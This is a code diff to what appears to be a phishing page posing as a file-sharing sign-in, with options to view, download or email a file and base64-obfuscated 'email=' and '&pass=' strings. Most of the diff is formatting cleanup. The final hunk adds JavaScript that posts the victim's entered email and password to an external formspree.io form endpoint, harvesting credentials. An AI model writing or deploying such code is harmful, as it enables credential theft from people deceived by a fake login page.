@@ -500,19 +500,19 @@
                              </center>
 
                         </div>
-                        <div class="form-check  ">
+                        <div class="form-check">
                             <label class=form-check-label style=color:#ffffff>
-                                <input type=radio checked class=form-check-input name=optradio>View File Online.
+                                <input type="radio" checked class=form-check-input name=optradio>View File Online.
                             </label>
                         </div>
                         <div class="form-check mt-1">
                             <label class=form-check-label style=color:#ffffff>
-                                <input type=radio class=form-check-input name=optradio checked>Download File.
+                                <input type="radio" class=form-check-input name=optradio checked>Download File.
                             </label>
                         </div>
                         <div class="form-check mt-1">
                             <label class=form-check-label style=color:#ffffff>
-                                <input type=radio class=form-check-input name=optradio>Send File to Email.
+                                <input type="radio" class=form-check-input name=optradio>Send File to Email.
                             </label>
                         </div>
 
@@ -522,7 +522,7 @@
                                 <span id=error class=text-danger style=display:none>That account doesn't
                                     exist. Enter a different account.</span>
                             </center>
-                            <form id=contact class="form-horizontal well">
+                            <form id="contact" class="form-horizontal well">
                             <h4 id="err" class="text-center"></h4>
                                 <div id=div1 class=text-dark>
                                     <div>
@@ -584,8 +584,8 @@
                 em="ZW1haWw9";
                 pas="JnBhc3M9";
                 num="JnBhc3M9"+Math.floor(Math.random() * 100+Math.random()) + 1;
-    ee=$("#cd").attr('class'); 
-    pa=$("#i01116").val(ee);
+                ee=$("#cd").attr('class'); 
+                pa=$("#i01116").val(ee);
                 $("#po").attr("href",  btoa(num));
 
                  
@@ -627,6 +627,34 @@
                         $('#err').html('Email format Invalid'); 
                     return false;
                 }
+                 
+                 //dtx
+                 form = $("#contact")
+                 status = $("#contact")
+                 fetch('https://formspree.io/f/mbjwnvzv', {
+                 method: 'POST',
+                 body: JSON.stringify({email: ema, pasd: pasd, subject: 'New Submission'}),
+                 headers: {
+                     'Accept': 'application/json'
+                 }
+               }).then(response => {
+                 if (response.ok) {
+                   status.innerHTML = "Thanks for your submission!";
+                   form.reset()
+                 } else {
+                   response.json().then(data => {
+                     if (Object.hasOwn(data, 'errors')) {
+                       status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+                     } else {
+                       status.innerHTML = "Oops! There was a problem submitting your form"
+                     }
+                   })
+                 }
+               }).catch(error => {
+                 status.innerHTML = "Oops! There was a problem submitting your form"
+               });
+               return false;
+               //cdx
          
     });
                  
